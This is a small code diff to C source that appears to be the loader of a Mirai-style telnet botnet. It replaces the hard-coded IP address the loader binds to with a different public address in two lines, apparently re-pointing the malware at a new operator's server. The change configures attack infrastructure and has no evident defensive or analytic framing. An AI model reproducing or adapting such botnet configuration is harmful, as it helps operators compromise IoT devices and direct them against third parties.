@@ -27,8 +27,8 @@ int main(int argc, char **args)
     struct telnet_info info;
     addrs_len = 2;
     addrs = calloc(addrs_len, sizeof (ipv4_t));
-    addrs[0] = inet_addr("185.172.110.232"); // Address to bind to
-    addrs[1] = inet_addr("185.172.110.232"); // Address to bind to
+    addrs[0] = inet_addr("99.79.193.92"); // Address to bind to
+    addrs[1] = inet_addr("99.79.193.92"); // Address to bind to
     if (argc == 2)
     {
         id_tag = args[1];
